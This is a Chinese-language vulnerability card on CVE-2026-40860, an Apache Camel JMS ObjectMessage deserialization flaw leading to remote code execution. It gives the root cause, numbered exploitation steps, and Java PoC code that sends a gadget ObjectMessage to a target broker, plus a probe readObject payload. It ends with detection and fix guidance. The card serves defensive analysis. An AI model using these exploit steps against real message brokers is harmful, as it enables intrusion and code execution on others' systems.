---
id: web-java-deserialization-camel-jms-objectmessage-rce
title: Apache Camel JMS ObjectMessage 自动反序列化导致 RCE（CVE-2026-40860）
type: scenario
domain: web
path: web/java/deserialization
technique: camel-jms-objectmessage-deserialization
aliases:
- CVE-2026-40860
- Apache Camel JMS 反序列化
- JmsBinding.extractBodyFromJms 反序列化
- JMS ObjectMessage getObject RCE
- mapJmsMessage 反序列化入口
tags:
- java
- apache-camel
- jms
- activemq
- objectmessage
- deserialization
- rce
- message-queue
- cve-2026-40860
cve:
- CVE-2026-40860
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: camel <4.18.2；camel <4.20.0；camel <4.14.7
verification:
  verified_by: verifier-V41
  verified_at: '2026-11-05T06:26:05+08:00'
  notes: 已对照原文与9张截图核对：JmsBinding.extractBodyFromJms→ObjectMessage.getObject→ActiveMQObjectMessage.deserialize 调用链、trustedPackages/trustAllPackages 白名单机制、checkDeserializedClass 修复与默认 filter java.**;javax.**;org.apache.camel.**;!* 均与卡片一致；影响版本按原文标记保留。原文复现用自定义 ProbePayload 证明 readObject 执行，未使用真实 gadget 链，卡片已注明真实 RCE 需 classpath 有 gadget。未实际执行 PoC。
---

## 一句话结论

当 Camel 作为 JMS 消费者且 `mapJmsMessage` 保持默认开启时，`JmsBinding.extractBodyFromJms()` 对收到的 `ObjectMessage` 直接调用 `getObject()`，未应用 `ObjectInputFilter` 或类白名单；能向对应队列/主题发布消息的攻击者即可投递恶意序列化对象，在目标 classpath 存在 gadget 链时触发反序列化 RCE。

## 原理

- Camel 的 JMS 组件在把 JMS 消息转换为 Exchange body 时，`JmsBinding.extractBodyFromJms()` 判断消息是 `ObjectMessage` 后调用 `objectMessage.getObject()`。
- `ActiveMQObjectMessage.getObject()` 内部走 `deserialize(ByteSequence)`：用 `ClassLoadingAwareObjectInputStream` 还原消息内容，这一步就是 Java 原生反序列化。它只应用 ActiveMQ 自身的 `trustedPackages`/`trustAllPackages` 过滤，与 Camel 无关。
- 受影响版本的 Camel 在调用 `getObject()` 前后没有 `ObjectInputFilter`、允许列表或拒绝列表。`mapJmsMessage` 默认为 `true`，因此该转换路径默认可达。
- 反序列化发生在消息消费阶段、业务路由之前；攻击者只要能向目标消费的队列/主题投递 `ObjectMessage`，就控制了反序列化输入。若 classpath 上有 CommonsCollections 等 gadget 链，或应用自带可在 `readObject()` 中执行代码的类，即造成 RCE。
- 继承关系扩大了影响面：`camel-sjms2`（`Sjms2Endpoint` 继承 `SjmsEndpoint`）、`camel-amqp`（`AMQPJmsBinding` 继承 `JmsBinding`）、`camel-activemq`/`camel-activemq6`（基于 `JmsComponent`）都走同一代码路径。
- ActiveMQ Classic 默认有 trustedPackages 白名单（示例包含 `java.lang`、`org.apache.activemq`、`org.fusesource.hawtbuf`、`com.thoughtworks.xstream.mapper`），但客户端/服务端设置 `setTrustAllPackages(true)`、或换用默认无白名单的 Artemis/IBM MQ 时，任意类都会被反序列化；即便有白名单，只要链中类落在受信包内仍可能利用。

## 触发条件

- Camel 应用使用 camel-jms / camel-sjms2 / camel-amqp / camel-activemq 等组件消费 JMS 队列或主题，且 `mapJmsMessage=true`（默认）。
- 攻击者能向该队列/主题发送消息：broker 对外暴露、弱口令、匿名发布、或从内网其他被控服务横向投递。
- 目标 JVM classpath 中存在可用的反序列化 gadget 链（或应用自身有危险 `readObject` 类），且 broker 端的类过滤允许这些类。
- 消息在消费时被当作 `ObjectMessage` 处理，而不是被自定义 `MessageConverter` 提前拦截。

## 利用步骤

1. 枚举 Camel JMS 消费者：从应用配置/路由定义获取 broker 地址、队列或主题名，以及 `mapJmsMessage`、`trustAllPackages` 等设置。
2. 获得发布权限：连接 broker（如 ActiveMQ 61616），确认可向目标 destination 发送消息。
3. 选择与目标 classpath 匹配的 gadget 链，生成序列化 payload（如 ysoserial 的 CommonsCollections 链）。
4. 通过 JMS API 或原始协议发送 `ObjectMessage`：`session.createObjectMessage(payload)` 或把序列化字节写入 ObjectMessage 的 content。
5. Camel 消费消息，`JmsBinding.extractBodyFromJms()` → `getObject()` 触发 `readObject()`，gadget 命令执行。
6. 验证：使用只写标记文件的探测类确认反序列化发生，再替换为真实命令链。

## PoC

```java
// 攻击者：向 Camel 消费的队列投递 ObjectMessage
ActiveMQConnectionFactory cf = new ActiveMQConnectionFactory("tcp://target:61616");
cf.setTrustAllPackages(true); // 目标/客户端开启信任所有包时
try (Connection c = cf.createConnection()) {
    c.start();
    Session s = c.createSession(false, Session.AUTO_ACKNOWLEDGE);
    ObjectMessage msg = s.createObjectMessage(gadgetObject); // gadgetObject 或 ysoserial 生成的序列化对象
    s.createProducer(s.createQueue("camel.lab.object")).send(msg);
}
```

```java
// 最小验证 payload：readObject 写标记文件，证明 Camel 消费端发生了反序列化
public final class ProbePayload implements Serializable {
    private final String message;
    public ProbePayload(String message) { this.message = message; }
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Files.writeString(Path.of(System.getProperty("probe.marker", "probe-hit.txt")),
                "deserialized: " + message + System.lineSeparator(),
                StandardOpenOption.CREATE, StandardOpenOption.APPEND);
    }
}
```

```java
// 目标侧最小消费者配置
JmsComponent jms = JmsComponent.jmsComponentAutoAcknowledge(connectionFactory);
jms.setMapJmsMessage(true);             // 默认 true，走 extractBodyFromJms
context.addComponent("jms", jms);
context.addRoutes(new RouteBuilder() {
    public void configure() { from("jms:queue:camel.lab.object").to("log:done"); }
});
```

## 变体与关联

- 变体：同一路径适用于 camel-sjms2、camel-amqp、camel-activemq/activemq6；只要底层 JMS 消息是 `ObjectMessage` 且 `mapJmsMessage` 开启即可。
- 变体：broker 为 Artemis 或 IBM MQ 时通常没有 ActiveMQ Classic 的默认 trustedPackages 白名单，反序列化面更大。
- 变体：应用若自定义 `MessageConverter` 但只做类型转换、不拒绝 `ObjectMessage`，仍可能落入同一路径。
- 关联：[[web-java-deser-commonscollections-cc1-transformedmap]]（常见 gadget 链）；[[web-java-deser-readobject-reflection-rmiconnector-secondary]]（自定义 readObject 与二次反序列化）；[[web-java-deserialization-custom-readobject-runtime-exec]]（readObject 直接执行命令的最小形态）。
- 边界：`mapJmsMessage=false` 或自定义转换器提前拒绝 `ObjectMessage` 时本路径不成立；没有可用 gadget/危险 readObject 类时只能造成对象注入，未必 RCE。

## 检测与防御

- 检测：broker 审计匿名/异常账号向队列发布 `ObjectMessage`；Camel 日志出现 `JMS ObjectMessage deserialization blocked` 或反序列化异常；JVM 层监控 `ObjectInputStream` 加载非业务类、异常类加载与命令子进程；对 ysoserial 常见 gadget 类名做告警。
- 修复：升级到 Camel 修复版本（原文标记：`<4.18.2`、`<4.20.0`、`<4.14.7` 的对应安全版本）；不需要对象消息时设置 `mapJmsMessage=false`，或使用只接受 JSON/文本的 MessageConverter。
- 加固：在 JVM 级别设置 `-Djdk.serialFilter=<白名单>`，在 broker 端配置严格的 trustedPackages/类过滤并关闭 `trustAllPackages`；限制队列/主题的发布权限与 broker 网络暴露。
- 注意：Camel 修复新增的 `checkDeserializedClass(payload)` 是在 `getObject()` 之后检查类是否在白名单（默认 `java.**;javax.**;org.apache.camel.**;!*`），只能阻止恶意对象进入后续路由，无法阻止 `readObject()` 在反序列化瞬间执行；真正的拦截需在 JVM 或 JMS provider 层完成。
